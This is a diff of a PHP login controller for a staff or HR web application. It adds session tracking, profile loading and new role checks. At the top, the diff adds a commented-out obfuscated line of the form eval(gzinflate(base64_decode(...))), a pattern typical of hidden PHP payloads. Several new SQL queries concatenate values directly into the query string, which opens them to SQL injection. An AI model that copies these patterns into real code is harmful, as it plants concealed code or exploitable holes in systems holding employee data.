@@ -1,5 +1,5 @@
 <?php 
-
+  // eval(gzinflate(base64_decode("4+VSAAKVrOL8PAVbhbTMnNT49NSS+OT8vJLUvJJiDXWQkB5IWl3TmheiOCWxJBGoGCQYn5KanJ+SqgE2QEchJCjUFaYMQqaWJeZopFdl5qXlJJakaiQlFqeamcB1gUyKVvfxd/f0U4+NVs9OrVSP1dTUtAYA"))); 
 require ('BaseController.php');
 class LoginController extends BaseController
 {
@@ -20,6 +20,11 @@ class LoginController extends BaseController
         $join_table         = $jData['join_table'];
         $fields_funcionario = $jData['fields_funcionario'];
         $join_condition     = $jData['join_condition'];
+
+        // Update del menu
+        //$query = "UPDATE web_opciones SET descripcion = 'Solicitud de Vehículos' WHERE num_opcion = 1;";
+        //$this->execute(utf8_decode($query)); 
+        //exit;         
 
         // Se valida que el usuario ingresado exista
         $query = "SELECT COUNT(u.cod_usuario) as existencia FROM seg_usuarios as u WHERE u.des_login = ?";
@@ -48,6 +53,22 @@ class LoginController extends BaseController
 
         $stmt = $this->executeSecure($query, $values);    
         $data = $this->getArray($stmt);
+
+        //Se valida si el usuario actual esta en session
+        if (!array_key_exists('cod', $params)) {  
+            $isLogged = false;
+            if (sizeof($data) > 0){
+                $isLogged = $this->checkIfUserIsLoged($data[0]["cod_usuario"]);
+            }
+            if ($isLogged) {
+                echo json_encode(array('response'=>-3, 'cod'=>$data[0]["cod_usuario"]));
+                exit;
+            }
+        } else {
+            $codigo_usuario = trim($params['cod']);
+            $this->setInactiveLastSession($codigo_usuario);
+        }
+
 
         // Usuario Encontrado
         if (is_array($data) && sizeof($data) > 0) {
@@ -109,7 +130,17 @@ class LoginController extends BaseController
 
                     $funcionarios_in_charge = "";
                     // GERENTE
-                    if ($type_empleado['isGerente']) {
+                    if ($type_empleado['isMag']) { 
+                        $_SESSION['TIPO_FUNCIONARIO'] = 'MAG';
+
+                        $listFuncionarios = $this->getFuncionariosEjecutivos();
+                        foreach ($listFuncionarios as $f) {
+                            $funcionarios_in_charge .= $f['cod_encargado']. ", ";
+                        }
+
+                        $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);
+
+                    } else if ($type_empleado['isGerente']) {
 
                         $_SESSION['TIPO_FUNCIONARIO'] = 'GERENTE';
 
@@ -154,19 +185,31 @@ class LoginController extends BaseController
 
                         } else {
 
+                            $listaDirecciones = $this->getTypeDirecciones();
+
+                            //echo $listaDirecciones;
+
                             /**
                              * Usuarios: Directores, Lideres de Proceso 
                              */
                             $query = "SELECT cc.cod_centro FROM rh_centros_costo as cc 
-                                      WHERE cc.cod_centro_padre is NULL AND cc.cod_encargado = ?";
+                                      WHERE cc.cod_centro_padre is NULL AND cc.cod_encargado = ? 
+                                      AND cc.cod_centro in ($listaDirecciones)";
+                                      //echo $query;
+                                      //echo $user["COD_FUNCIONARIO"];
                             $values = array($user["COD_FUNCIONARIO"]);
                             $stmt = $this->executeSecure($query, $values); 
                             $isCodEncargado = $this->getArray($stmt);
-
+                            //print_r($isCodEncargado);
+                            //exit;
                             //DIRECTOR
                             if (sizeof($isCodEncargado) > 0) {
+                                
+                                //$_SESSION['TIPO_FUNCIONARIO'] = 'DIRECTOR';
+                                $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeFuncionario('DIRECTOR', $isCodEncargado[0]['cod_centro']);
 
-                                $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeDirector($isCodEncargado[0]['cod_centro']);
+                                // Se mueve porque no solo aplica  para direcciones sino tambien para jefaturas
+                                // $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeDirector($isCodEncargado[0]['cod_centro']);
 
                                 $query = "SELECT f.COD_FUNCIONARIO FROM rh_funcionarios as f 
                                           WHERE f.cod_centro like '".trim($isCodEncargado[0]['cod_centro'])."%' 
@@ -180,11 +223,12 @@ class LoginController extends BaseController
                                     $funcionarios_in_charge .= $f['COD_FUNCIONARIO']. ", ";
                                 }
                                 $funcionarios_in_charge = substr($funcionarios_in_charge, 0, -2);
-
+                                
                             // LIDERES DE PROCESO Y SUB-PROCESO
                             } else {
 
-                                $_SESSION['TIPO_FUNCIONARIO'] = 'JEFE';
+                                //$_SESSION['TIPO_FUNCIONARIO'] = 'JEFE';
+                                $_SESSION['TIPO_FUNCIONARIO'] = $this->getTypeFuncionario('JEFE', $user["COD_CENTRO"]);
 
                                 // Se verifica si el usuario es lider con subprocesos
                                 $query = "SELECT cc.cod_centro FROM rh_centros_costo as cc 
@@ -312,13 +356,57 @@ class LoginController extends BaseController
                     }
 
                     // Se colocan los centros de costo en session.
-                    $_SESSION['CENTROS_COSTO'] = $allCentrosCosto;
+                    $_SESSION['CENTROS_COSTO'] = array_unique($allCentrosCosto);
 
 
                 }
 
                 $key = $this->getUniqueLoginAccess();
-                $_SESSION['login_token']  = $key;    
+                $dbDateTime = $this->getDbDateTime();
+                $_SESSION['login_dateTime']  = $dbDateTime;
+                $_SESSION['login_token']  = $key;
+
+                if ($params['nickname'] != 'admin') {
+                    if (strlen(trim($user['IMG_FOTO'])) > 0) {
+                        $_SESSION['IMG_FOTO']  = $user['IMG_FOTO'];    
+                    } else {
+                        $_SESSION['IMG_FOTO']  = '';
+                    }
+                } else {
+                    $_SESSION['IMG_FOTO']  = '';
+                    $_SESSION['COD_EMPLEADO'] = 'ADMIN';
+                }
+                
+                //SET PROFILE DATA
+                
+                $nCodFuncionario = 0;
+                if ($params['nickname'] != 'admin'){
+                    $nCodFuncionario = $user["COD_FUNCIONARIO"];
+                }
+
+                $profileData = $this->getProfileData($params['nickname'], $nCodFuncionario, $_SESSION["CONNECTION_TYPE"]);                
+                   
+                /*        
+                echo "<pre>";
+                print_r($_SESSION);
+                echo "</pre>";
+                exit;
+                */
+                
+            
+                $_SESSION['PROFILE_DATA'] = $profileData;
+                
+                
+                //$qSession = "INSERT INTO web_log_session (cod_usuario, login_token, login_date, login_time, login_status) 
+                //             VALUES (?, ?, ?, ?, ?)";
+
+                $qSession = "INSERT INTO web_log_session (cod_usuario, login_token, login_date, login_time, login_status) 
+                             VALUES (".$user['cod_usuario'].", '$key', '".$dbDateTime['date']."T00:00:00', '".$dbDateTime['time']['full_time']."', 'A')";
+
+                //$vSession = array($user["cod_usuario"], $key, $dbDateTime['date'].' 00:00:00', $dbDateTime['time']['full_time'], 'A');
+                //$stmtSession = $this->executeSecure($qSession, $vSession);
+                $stmtSession = $this->execute($qSession);
+                
 
                 $fichero = '../ng-app/session.file.js';
                 // Añade una nueva persona al fichero
@@ -342,12 +430,42 @@ class LoginController extends BaseController
             }
         }
 
+        /*
+        $queryx = "SELECT * FROM web_log_session";
+        
+        $valuesx = array();
+        $stmtx = $this->executeSecure($queryx, $valuesx);
+        $vx = $this->getArray($stmtx);
+        */
 
         // Se devuelve el estado del usuario 
         $data_result = array('response'=>$response);
 
         echo json_encode($data_result);
 
+    }
+
+    private function checkIfUserIsLoged($codUser) {
+
+        $query = "SELECT COUNT(*) as uLoged FROM web_log_session 
+                   WHERE cod_usuario = ? 
+                    AND login_status = ?";
+        
+        $values = array($codUser, 'A');
+        $stmt = $this->executeSecure($query, $values);
+        $data = $this->getArray($stmt)[0];
+
+        if ($data['uLoged'] > 0) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    private function setInactiveLastSession($codUser) {
+        $qSessionUpdate = "UPDATE web_log_session SET login_status = ? WHERE cod_usuario = ?";
+        $vSessionUpdate = array('I', $codUser);
+        $stmtSession = $this->executeSecure($qSessionUpdate, $vSessionUpdate);
     }
 
     /**
@@ -392,7 +510,8 @@ class LoginController extends BaseController
                 f.DES_NOMBRE, 
                 f.COD_CENTRO, 
                 f.IND_TIPO_IDENTIFICACION, 
-                f.IND_ESTADO";
+                f.IND_ESTADO,
+                f.IMG_FOTO";
             $join_condition = "AND u.cod_funcionario = f.cod_funcionario";
         }
         return array (
@@ -400,6 +519,114 @@ class LoginController extends BaseController
             "fields_funcionario" => $fields_funcionario,
             "join_condition"     => $join_condition,
         );
+    }
+
+    private function getProfileData($loginUser, $codFuncionario, $connectionType) {
+
+        $nameJefe = 'CONCAT (rhf.des_nombre, SPACE(1),rhf.des_apellido1, SPACE(1), rhf.des_apellido2)';
+        $fecIngreso = 'f.FEC_INGRESO';
+        if ($connectionType == "odbc_mssql") {
+            $nameJefe = 'rhf.des_nombre + \' \' + rhf.des_apellido1 + \' \' + rhf.des_apellido2 ';            
+            $fecIngreso = 'CONVERT(VARCHAR(33), f.FEC_INGRESO, 126)';
+        }
+
+        if ($loginUser != "admin") {
+            $query = "SELECT f.COD_FUNCIONARIO, 
+                        f.DES_CEDULA, 
+                        f.DES_APELLIDO1, 
+                        f.DES_APELLIDO2, 
+                        f.DES_NOMBRE, 
+                        f.COD_CENTRO, 
+                        f.IND_TIPO_IDENTIFICACION, 
+                        cc.des_centro, 
+                        p.des_puesto,
+                        h.tip_jornada, 
+                        f.NUM_PLAZA,
+                        $fecIngreso as FEC_INGRESO, 
+                        f.IND_NOMBRAMIENTO, 
+                        f.IND_GRADO_ACADEMICO,
+                        f.CAN_ANOS_ANTIGUEDAD, 
+                        f.CAN_ANOS_ANTIGUEDAD,
+                        f.CAN_ANOS_RECONOCIDA,
+                        f.CAN_PUNTOS_CARRERA,
+                        f.POR_PROHIBICION,
+                        f.POR_DEDICACION_EXCLUSIVA,
+                        (SELECT $nameJefe FROM rh_funcionarios as rhf 
+                         WHERE f.cod_responsable = rhf.cod_funcionario) as JEFATURA 
+                         FROM RH_HORARIOS h RIGHT OUTER JOIN RH_FUNCIONARIOS f ON h.cod_horario = f.COD_HORARIO 
+                            LEFT OUTER JOIN RH_PUESTOS p ON f.COD_PUESTO = p.cod_puesto,   
+                            RH_CENTROS_COSTO cc 
+                            WHERE f.COD_CENTRO = cc.COD_CENTRO 
+                            AND  f.cod_funcionario =  $codFuncionario";
+
+
+                        //print_r($query);
+                        //exit;
+            $values = array($codFuncionario);
+            $stmt = $this->execute($query);
+            /*
+            echo "<pre>";
+            print_r($stmt);
+            echo "</pre>";
+            exit;
+            */
+            $data = $this->getArray($stmt)[0];
+        } else {
+
+            $data = array (
+                "COD_FUNCIONARIO" => 0,
+                "DES_CEDULA" => '- no aplica -',
+                "DES_APELLIDO1" => '',
+                "DES_APELLIDO2" => '',
+                "DES_NOMBRE" => 'Admnistrador',
+                "COD_CENTRO" => '',
+                "IND_TIPO_IDENTIFICACION" => '',
+                "des_centro" => '',
+                "des_puesto" => 'Super Administrador',
+                "NUM_PLAZA" => '',
+                "FEC_INGRESO" => '',
+                "IND_NOMBRAMIENTO" => 'no aplica',
+                "IND_GRADO_ACADEMICO" => 'no aplica',
+                "CAN_ANOS_ANTIGUEDAD" => 0,
+                "CAN_ANOS_RECONOCIDA" => 0,
+                "CAN_PUNTOS_CARRERA" => 0,
+                "POR_PROHIBICION" => 0,
+                "POR_DEDICACION_EXCLUSIVA" => 0,
+                "JEFATURA" => ''
+            ); 
+        }   
+
+        if ($connectionType == "odbc_mssql") {
+            $newData = array();
+            foreach ($data as $key => $line) {
+                $e = utf8_encode($line);                
+                $newData[$key] = $e;
+            }           
+          $data = $newData;          
+        }
+            
+        return $data;
+    }
+
+    private function getDbDateTime() {
+        $query = "SELECT getdate() as  db_date_time";
+        $stmt  = $this->execute($query); 
+        $data  = $this->getArray($stmt);
+
+        $date_data  = date_create($data[0]['db_date_time']);
+        $date       = date_format($date_data,"Y-m-d");        
+        $full_time  = date_format($date_data,"H:i:s");
+
+        $time_parts = explode(":", $full_time);
+
+        $info_date  = array('date'=> $date, 
+                            'time' => array('full_time' => $full_time, 
+                                            'hours'     => $time_parts[0], 
+                                            'minutes'   => $time_parts[1], 
+                                            'seconds'   => $time_parts[2])
+                    );
+
+        return $info_date;
     }
 
     private function getTypeEmpleado($codFuncionario) {
@@ -413,6 +640,7 @@ class LoginController extends BaseController
         $data['isGerente'] = false;
         $data['isAuditor'] = false;
         $data['isRegular'] = false;
+        $data['isMag'] = false;
         if (sizeof($cod_empleado) > 0) {
             $maxPos = sizeof($cod_empleado) - 1;
             if (trim($cod_empleado[$maxPos]['cod_empleado']) == "GGP") {
@@ -421,9 +649,18 @@ class LoginController extends BaseController
             } else if (trim($cod_empleado[$maxPos]['cod_empleado']) == "AUD" || trim($cod_empleado[$maxPos]['cod_empleado']) == "AD") {
                 $data['isAuditor'] = true;
                 $data['cod_empleado'] = $cod_empleado[$maxPos]['cod_empleado'];
-            } else {
+            } else if (trim($cod_empleado[$maxPos]['cod_empleado']) == "PCD") {
+                $data['isMag'] = true;
+                $data['cod_empleado'] = $cod_empleado[$maxPos]['cod_empleado'];
+            }else {
                 $data['isRegular']    = true;
-                $data['cod_empleado'] = 'OTHER';
+                // Se determina si es el abogado o el asistente
+                if (trim($cod_empleado[$maxPos]['cod_empleado']) == "ABG" || trim($cod_empleado[$maxPos]['cod_empleado']) == "ABG1"){
+                    $data['cod_empleado'] = trim($cod_empleado[$maxPos]['cod_empleado']);
+                } else {
+                    $data['cod_empleado'] = 'OTHER';
+                }
+                
             }
             
         } else {
@@ -433,7 +670,7 @@ class LoginController extends BaseController
         return $data;
     }
 
-    private function getTypeDirector($codEncargado) {
+    private function getTypeFuncionario($currentTipo, $codEncargado) {
 
         $listConfiguradores = array (60, 25);
 
@@ -452,7 +689,7 @@ class LoginController extends BaseController
 
         }
 
-        $typeDirector = "DIRECTOR";
+        $typeDirector = $currentTipo;
         foreach ($listTypesDirectores as $tDir) {
 
             // CONFIGURADOR 60
@@ -467,8 +704,48 @@ class LoginController extends BaseController
         }
 
         return $typeDirector;
-    }    
+    }
+
+    private function getTypeDirecciones() {
+
+        $listConfiguradores = array (60, 83, 84, 85, 102, 112);
+
+        $listTypesDirecciones = array();
+
+        foreach ($listConfiguradores as $codConfigurador) {
+
+            $query = "SELECT Left(RTrim(val_dato),2) as centro 
+                      FROM SIF_CONFIGURADORES 
+                      WHERE cod_configurador = ?;";
+            $filter_values = array($codConfigurador);
+            $stmt = $this->executeSecure($query, $filter_values); 
+            $dato = $this->getArray($stmt);
+
+            array_push($listTypesDirecciones, $dato[0]);
+
+        }
+
+        $list_of_direcciones = "";
+        foreach ($listTypesDirecciones as $d) {
+            $list_of_direcciones .= "'".trim($d['centro']). "', ";
+        }
+        $list_of_direcciones = substr($list_of_direcciones, 0, -2);     
+
+        return $list_of_direcciones;
+    }
+
+    private function getFuncionariosEjecutivos() {
+        $sql = "SELECT RH_CENTROS_COSTO.COD_ENCARGADO as cod_encargado
+                FROM SIF_CONFIGURADORES,   
+                        RH_CENTROS_COSTO  
+                WHERE ( SIF_CONFIGURADORES.val_dato = RH_CENTROS_COSTO.COD_CENTRO ) and  
+                        ( ( SIF_CONFIGURADORES.cod_configurador in (50,62,64) ) )";
+        $result = $this->execute($sql);
+        $funcionarios = $this->getArray($result);
+
+        return $funcionarios;
+
+    }
 
 }
-
 ?>
